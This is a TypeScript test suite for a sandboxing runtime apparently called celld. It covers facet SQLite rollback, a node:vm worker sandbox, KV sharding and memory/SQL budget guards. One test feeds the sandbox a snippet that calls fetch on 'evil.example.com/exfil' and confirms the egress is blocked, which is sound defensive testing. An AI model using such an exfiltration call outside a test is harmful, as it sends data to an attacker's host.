/**
 * @fileoverview M15 denoland/celld Native Durable Object Facets, Real node:vm Dynamic Workers, KV Sharding & V8 Budget Suite (4 tests).
 */
import { describe, it } from "node:test";
import * as assert from "node:assert/strict";
import {
  DurableObjectFacetSupervisor,
  DynamicWorkerSandboxLoader,
  CelldKvOptimizerAndGuard,
  V8HeapAndSqlBudgetGuard,
  InMemoryCellSqlStorage,
  InMemoryKvNamespace,
  SqlStorageLike,
} from "../src/index.js";

describe("M15 denoland/celld Native Capabilities Suite", () => {
  it("1. DurableObjectFacetSupervisor spawns isolated sub-actor Facet with dedicated SQLite and supports transactional rollback & abort/delete", async () => {
    const sup = new DurableObjectFacetSupervisor();
    const { facetRecord, facetSql } = sup.spawnToolFacet(
      "task-f1",
      1,
      "python_repl",
      () => new InMemoryCellSqlStorage()
    );
    assert.equal(facetRecord.status, "SPAWNED");
    facetSql.exec("CREATE TABLE facet_local (k TEXT PRIMARY KEY, v TEXT)");
    facetSql.exec("INSERT INTO facet_local (k, v) VALUES (?, ?)", "k1", "committed");
    facetSql.exec("BEGIN");
    facetSql.exec("INSERT INTO facet_local (k, v) VALUES (?, ?)", "k2", "rolled-back");
    facetSql.exec("ROLLBACK");
    const rows = facetSql.exec("SELECT * FROM facet_local WHERE k = ? AND v = ?", "k1", "committed").toArray();
    assert.equal(rows.length, 1);
    const rolledBackRow = facetSql.exec("SELECT * FROM facet_local WHERE k = ?", "k2").one();
    assert.equal(rolledBackRow, null);

    const aborted = sup.abortFaultyFacet(facetRecord.facetName, new Error("Tool panic"));
    assert.equal(aborted.status, "ABORTED");
    const deleted = await sup.deleteCompletedFacet(facetRecord.facetName);
    assert.equal(deleted, true);
  });

  it("2. DynamicWorkerSandboxLoader genuinely compiles & executes untrusted JS in node:vm isolate and blocks outbound fetch when globalOutbound: null", async () => {
    const loader = new DynamicWorkerSandboxLoader();
    const res = await loader.executeUntrustedCodeInIsolate({
      taskId: "task-dw-1",
      turnIndex: 2,
      jsSourceCode: `
        export default {
          async fetch(req, env) {
            const body = await req.json();
            return new Response(JSON.stringify({ computed: body.x * 3 + 1, task: env.TASK_ID }));
          }
        }
      `,
      allowInternetEgress: false,
      inputPayload: { x: 14 },
    });
    assert.equal(res.globalOutboundBlocked, true);
    assert.equal(res.output.computed, 43);
    assert.equal(res.output.task, "task-dw-1");
    assert.ok(res.coldStartLatencyMs > 0 && res.coldStartLatencyMs < 250);

    await assert.rejects(async () => {
      await loader.executeUntrustedCodeInIsolate({
        taskId: "task-dw-egress",
        turnIndex: 3,
        jsSourceCode: `
          export default {
            async fetch() {
              await fetch("https://evil.example.com/exfil");
              return new Response("{}");
            }
          }
        `,
        allowInternetEgress: false,
      });
    }, /DynamicWorker Egress Blocked: globalOutbound is null/);
  });

  it("3. CelldKvOptimizerAndGuard shards hot keys across 32 KV cells and enforces 25 MiB value limit", async () => {
    const kv = new InMemoryKvNamespace();
    const guard = new CelldKvOptimizerAndGuard(kv, 32);
    const putRes = await guard.putSafe("idem", "key-1", JSON.stringify({ ok: true }), 3600);
    assert.ok(putRes.shardId >= 0 && putRes.shardId < 32);
    const val = await guard.getSafe("idem", "key-1");
    assert.equal(val, JSON.stringify({ ok: true }));
  });

  it("4. V8HeapAndSqlBudgetGuard measures real process.memoryUsage().heapUsed and real wall-clock SQL query execution time", () => {
    const guard = new V8HeapAndSqlBudgetGuard(96, 128, 3);
    const realHeapEval = guard.evaluateHeapPressure();
    assert.ok(realHeapEval.measuredHeapMb > 1);
    assert.equal(guard.evaluateHeapPressure(105).status, "EVICT_WARM_BUFFERS");
    assert.equal(guard.evaluateHeapPressure(122).status, "REJECT_NEW_STREAMS");

    const slowSql: SqlStorageLike = {
      exec: () => {
        const start = performance.now();
        while (performance.now() - start < 8) {
          // Real busy wait > 3ms budget
        }
        return { toArray: () => [], one: () => null };
      },
    };
    assert.throws(() => {
      guard.execWithBudget(slowSql, "SELECT * FROM heavy_join_table");
    }, /exceeded celld per-statement timeout/);
  });
});
